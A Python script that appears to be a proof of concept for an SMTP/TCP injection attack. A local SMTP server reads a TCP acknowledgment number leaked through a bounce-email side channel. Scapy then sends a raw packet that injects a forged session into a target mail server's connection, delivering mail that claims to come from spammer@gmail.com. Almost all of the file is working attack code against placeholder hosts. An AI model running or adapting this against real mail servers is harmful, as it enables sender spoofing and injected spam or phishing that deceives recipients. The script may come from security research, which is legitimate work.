from datetime import datetime
import asyncore
import sys
from smtpd import SMTPServer
from scapy.all import *
import time




class EmlServer(SMTPServer):
    def process_message(self, peer, mailfrom, rcpttos, data, **kwargs):        
        if 'test' in rcpttos[0] or 'spammer' in rcpttos[0]:
            print('duno')
        else:
            t = time.localtime()
            current_time = time.strftime("%H:%M:%S", t)
            print(current_time)
            print(rcpttos[0])
            ack_number = int(rcpttos[0].split('@')[0])

            # get correct ack_number from email (bounce) feedback channel 


            ip = IP(src='',dst='')
            sent_payload = "EHLO mail.spoofer.com\r\nMAIL FROM:<%d@mail.spoofer.com>\r\nRCPT TO:<incoming@mail.target.com>\r\nDATA\r\nFrom:%d@mail.spoofer.com\r\nTo:incoming@mail.target.com\r\nSubject:test email\r\n\r\nThis is test email body\r\n.\r\n" % (ack_number,ack_number)
            
            tcp = TCP(sport=49884,dport=25,seq=1+len(sent_payload),ack=ack_number,flags='PA')
            
            payload =  b"NOOP\r\nNOOP\r\nNOOP\r\nEHLO gmail.com\r\nMAIL FROM:<spammer@gmail.com>\r\nRCPT TO:<incoming@mail.target.com>\r\nDATA\r\nFrom:spammer@gmail.com\r\nTo:incoming@mail.target.com\r\nSubject:This is a spammer message\r\n\r\nThis is a spammer message\r\n.\r\n"
            time.sleep(2)
            send(ip/tcp/payload)

        

if __name__ == '__main__':
    conf.L3socket = L3RawSocket
    server = EmlServer(('',25),None)
    try:
        asyncore.loop()
    except KeyboardInterrupt:
        exit(0)



